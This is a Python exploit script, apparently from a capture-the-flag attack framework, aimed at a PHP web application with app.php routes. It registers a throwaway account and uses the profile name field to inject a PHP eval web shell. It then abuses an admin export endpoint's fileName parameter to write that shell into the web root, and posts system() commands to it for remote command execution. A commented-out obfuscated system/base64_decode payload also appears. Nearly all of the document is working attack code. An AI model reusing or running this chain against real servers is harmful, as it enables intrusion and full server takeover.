#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import hashlib
import time


def vulnerable_attack(target,target_port,cmd):
        
    
    try:           
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        res = shit(target,target_port,cmd)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




def shit(target,target_port,cmd):
    s = requests.Session()
    ip = target
    shellhash =  hashlib.md5(str(time.time())).hexdigest()

    url = 'http://%s:%s/app.php/login' % (ip,str(target_port))
    url_2 = 'http://%s:%s/app.php/login_check' %(ip,str(target_port))
    url_3 = 'http://%s:%s/app.php/' %(ip,str(target_port))
    url_4 = 'http://%s:%s/app.php/settings/' % (ip,str(target_port))
    url_5 = 'http://%s:%s/app.php/logout' % (ip,str(target_port))
    url_6 = 'http://%s:%s/app.php/admin/order/manage/export/course?loop=s&start=0&fileName=/var/www/html/web/files/%s.php' % (ip,str(target_port),shellhash)
    url_7 = 'http://%s:%s/app.php/register/submited/1/ae797a91d0493acb27050b05c884a4ae'  % (ip,str(target_port))

    url_8 = 'http://%s:%s/app.php/register' %(ip,str(target_port))
    url_9 = 'http://%s:%s/app.php/order/show?targetId=1&targetType=course' %(ip,str(target_port))

    '''
    url = 'http://%s:%s/login' % (ip,str(target_port))
    url_2 = 'http://%s:%s/login_check' %(ip,str(target_port))
    url_3 = 'http://%s:%s/' %(ip,str(target_port))
    url_4 = 'http://%s:%s/settings/' % (ip,str(target_port))
    url_5 = 'http://%s:%s/logout' % (ip,str(target_port))
    url_6 = 'http://%s:%s/admin/order/manage/export/course?loop=s&start=0&fileName=/var/www/html/web/files/%s.php' % (ip,str(target_port),shellhash)
    url_7 = 'http://%s:%s/register/submited/1/ae797a91d0493acb27050b05c884a4ae'  % (ip,str(target_port))
    '''

    # user register

    content = s.get(url).content
    index_1 = content.find('<meta name="description"')
    index_2 = content.find('name="csrf-token"/>')
    token = content[index_1 + 35 + len('<meta name="description"') : index_2-2]
    debug_print(token)
    my_random = hashlib.md5(str(time.time())).hexdigest()[0:5]
    email = my_random +'@' + my_random + '.' + my_random
    nickname = my_random + my_random
    print nickname
    password = my_random + my_random
    s.post(url_8,data={'email':'%s'%email,'nickname':'%s'%nickname,'password':'%s'%password,'_csrf_token':'%s'%token})
    s.get(url_9)
    
    # user login
    content = s.get(url).content
    index_1 = content.find('<meta name="description"')
    index_2 = content.find('name="csrf-token"/>')
    token = content[index_1 + 35 + len('<meta name="description"') : index_2-2]
    debug_print(token)
    s.post(url_2,data={'_username':'%s'%nickname,'_password':'%s'%password,'_csrf_token':'%s'%token})
    s.get(url_3)
    
    # user shell
    shell = '<?php eval($_POST[2222]);?>'
    s.post(url_4, data = {'profile[truename]':'%s'%shell,'_csrf_token':'%s'%token})
    s.get(url_5)
    

    # admin login
    s.get(url_7)
    s.get(url_6,allow_redirects=False)
    payload = "system('%s');"%cmd
    data = '2222=%s'% quote(payload)

    res = http("post",target,target_port,"/files/%s.php"%shellhash,data,headers) 
    print res

    return res
